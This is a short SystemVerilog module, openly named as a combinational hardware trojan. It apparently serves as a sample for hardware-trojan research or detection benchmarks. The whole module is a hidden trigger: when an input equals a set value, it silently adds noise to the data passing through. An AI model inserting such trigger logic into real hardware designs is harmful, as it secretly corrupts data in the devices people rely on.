module combinational_trojan_1 #(
    parameter DATA_WIDTH = 8,
    parameter NOISE_VALUE = 5,
    parameter NUMBER_OF_TRIGGERS = 1,
    parameter TRIGGER_VALUES_0 = 4
)(        
    input wire [DATA_WIDTH-1:0] data_in [NUMBER_OF_TRIGGERS] ,
    input wire [DATA_WIDTH-1:0] data_payload_in,
    output reg [DATA_WIDTH-1:0] data_payload_out
);

    wire is_trigger_condition;    

    assign is_trigger_condition = (data_in[0] == TRIGGER_VALUES_0);
    
    always @(*) begin
        data_payload_out = data_payload_in;        
        if (is_trigger_condition) begin                
            data_payload_out = data_payload_in + NOISE_VALUE;
        end        
    end

endmodule
